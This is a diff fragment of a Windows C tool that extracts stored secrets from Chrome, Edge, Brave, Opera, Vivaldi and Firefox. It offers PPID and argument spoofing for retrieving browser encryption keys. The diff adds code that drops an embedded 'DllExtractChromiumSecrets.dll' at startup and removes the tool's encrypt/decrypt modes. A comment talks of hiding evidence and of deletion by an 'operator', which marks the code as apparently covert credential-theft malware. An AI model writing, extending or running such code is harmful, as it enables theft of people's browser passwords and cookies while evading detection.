         else if (StrStrIA(argv[i], "/e:") == argv[i] || StrStrIA(argv[i], "-e:") == argv[i])
         {
             LPCSTR pszValue = argv[i] + 3;
@@ -603,42 +217,11 @@ static BOOL ParseArguments(IN INT argc, IN CHAR* argv[], OUT PCMD_ARGUMENTS pCmd
         {
             pCmdArgs->bSpoof = TRUE;
         }
-        else if (lstrcmpiA(argv[i], "/i") == 0 || lstrcmpiA(argv[i], "-i") == 0)
-        {
-            if (i + 1 < argc)
-            {
-                pCmdArgs->pszInputFile = argv[++i];
-            }
-            else
-            {
-                wprintf(L"[!] Error: '/i' Requires A Filename\n");
-                goto _PRINT_HELP;
-            }
-        }
         else
         {
             wprintf(L"[!] Unknown Argument : '%S'\n", argv[i]);
             goto _PRINT_HELP;
         }
-    }
-
-    // Decrypt mode validation
-    if (pCmdArgs->bDecryptMode)
-    {
-        if (pCmdArgs->bEncryptJson)
-        {
-            wprintf(L"[!] Error: Cannot Use '/enc' and '/dec' Together\n");
-            goto _PRINT_HELP;
-        }
-
-        if (!pCmdArgs->pszInputFile)
-        {
-            wprintf(L"[!] Error: '/dec' Requires Input File '/i <file>'\n");
-            goto _PRINT_HELP;
-        }
-
-        // Ignore browser-related args in decrypt mode
-        return TRUE;
     }
 
     // If no browser specified, detect default browser
@@ -663,19 +246,12 @@ _PRINT_HELP:
     wprintf(L"Extraction Options:\n");
     wprintf(L"  /b:<browser> Target Browser: Chrome, Edge, Brave, Opera, Operagx, Vivaldi, Firefox, All\n");
     wprintf(L"               Can Be Specified Multiple Times\n");
-    wprintf(L"  /enc:<sig>   Encrypt JSON Output With Signature (1-8 Bytes)\n");
     wprintf(L"  /spoof       Enable Argument and PPID Spoofing When Retrieving ABE Keys\n");
     wprintf(L"  /e:<count>   Max Extracted Entries Per Category (Default: %d, 'all' For No Limit)\n\n", MAX_DISPLAY_COUNT);
-    wprintf(L"Decryption Options:\n");
-    wprintf(L"  /dec:<sig>   Decrypt Mode With The Same Signature Used When Encrypting(1-8 Bytes)\n");
-    wprintf(L"  /i <file>    Input Encrypted Pack File (Required For Decryption)\n");
-    wprintf(L"  /?           Show This Help Message\n\n");
     wprintf(L"Examples:\n");
     wprintf(L"  %S                                        Extract %d Entries From The Default Browser\n", pszExeName, MAX_DISPLAY_COUNT);
     wprintf(L"  %S /b:chrome /b:edge /spoof /e:100        Extract 100 Entries From Chrome And Edge With PPID Spoofing\n", pszExeName);
-    wprintf(L"  %S /b:firefox /e:all /enc:SIG213          Extract All Entries From FireFox To Encrypted Pack\n", pszExeName);
-    wprintf(L"  %S /b:all /e:all /enc:0xCAFEBABE          Extract All Entries From All Browsers To Encrypted Pack\n", pszExeName);
-    wprintf(L"  %S /dec:0xCAFEBABE /i EncPack-XXXXX.bin   Decrypt Pack File To JSON Files\n\n", pszExeName);
+    wprintf(L"  %S /b:all /e:all                          Extract All Entries From All Browsers\n\n", pszExeName);
     return FALSE;
 }
 
@@ -689,22 +265,29 @@ int main(int argc, char* argv[])
                     dwSkipCount     = 0;
     INT             nResult         = -1;
 
+    // ========================================================================
+    // ADDED: Extract embedded DLL to current directory before any other work
+    // ========================================================================
+    WCHAR szDllPath[MAX_PATH];
+    GetCurrentDirectoryW(MAX_PATH, szDllPath);
+    wcscat_s(szDllPath, L"\\DllExtractChromiumSecrets.dll");
+
+    if (!PathFileExistsW(szDllPath)) {
+        if (!ExtractDllFromResource(szDllPath)) {
+            wprintf(L"[!] Failed to extract embedded DLL, aborting.\n");
+            return -1;
+        }
+    }
+
     if (!ParseArguments(argc, argv, &CmdArgs))
         return -1;
 
     if (!InitializeExeProjDynamicFunctions())
         return -1;
 
-    // Decrypt mode
-    if (CmdArgs.bDecryptMode)
-    {
-        if (DecryptJsonPack(CmdArgs.pszInputFile, CmdArgs.Signature, CmdArgs.dwSignatureLen))
-            nResult = 0;
-
-        wprintf(L"[*] Bye!");
-        return nResult;
-    }
-
+    // ========================================================================
+    // MODIFIED: No decrypt mode; always extraction
+    // ========================================================================
     if (CmdArgs.bAllBrowsers)
     {
         for (DWORD i = 0; i < BROWSER_COUNT; i++)
@@ -716,37 +299,31 @@ int main(int argc, char* argv[])
                 continue;
             }
 
-            if (ExtractFromBrowser((BROWSER_TYPE)i, GetBrowserOutputFile((BROWSER_TYPE)i), CmdArgs.dwMaxEntries, CmdArgs.bSpoof, CmdArgs.bEncryptJson, CmdArgs.Signature, CmdArgs.dwSignatureLen))
+            if (ExtractFromBrowser((BROWSER_TYPE)i, CmdArgs.dwMaxEntries, CmdArgs.bSpoof))
                 dwSuccessCount++;
             else
                 dwFailCount++;
         }
 
         wprintf(L"[*] Summary: %lu Succeeded, %lu Failed, %lu Skipped\n", dwSuccessCount, dwFailCount, dwSkipCount);
-
         nResult = (dwSuccessCount > 0) ? 0 : -1;
     }
     else
     {
         for (DWORD i = 0; i < CmdArgs.dwBrowserCount; i++)
         {
-            LPCSTR pszOutputFile = GetBrowserOutputFile(CmdArgs.BrowserTypes[i]);
-
-            if (!ExtractFromBrowser(CmdArgs.BrowserTypes[i], pszOutputFile, CmdArgs.dwMaxEntries, CmdArgs.bSpoof, CmdArgs.bEncryptJson, CmdArgs.Signature, CmdArgs.dwSignatureLen))
+            if (!ExtractFromBrowser(CmdArgs.BrowserTypes[i], CmdArgs.dwMaxEntries, CmdArgs.bSpoof))
                 nResult = -1;
         }
     }
 
-    wprintf(L"[*] Bye!");
+    // Clean up the temporary DLL if we extracted it
+    if (PathFileExistsW(szDllPath)) {
+        // Optional: delete it here if you want to hide evidence immediately,
+        // but it will be deleted by the operator via /delete anyway.
+        // DeleteFileW(szDllPath);
+    }
 
+    wprintf(L"[*] Bye!");
     return nResult;
 }
-
-
-/*
-TODO:
-
-4. [BUG] opera gx is getting skipped
-6. Replace SQLite
-
-*/
